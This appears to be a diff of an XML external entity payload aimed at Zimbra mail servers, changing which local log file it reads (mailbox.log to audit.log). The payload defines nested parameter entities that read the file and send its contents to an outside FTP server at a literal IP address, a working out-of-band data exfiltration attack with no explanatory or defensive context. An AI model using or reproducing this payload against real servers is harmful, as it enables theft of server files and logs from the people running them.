@@ -1,5 +1,5 @@
 
-<!ENTITY % payload SYSTEM "file:///opt/zimbra/log/mailbox.log">
+<!ENTITY % payload SYSTEM "file:///opt/zimbra/log/audit.log">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://118.184.43.35:110/%payload;'>">
 %int;
 %trick;
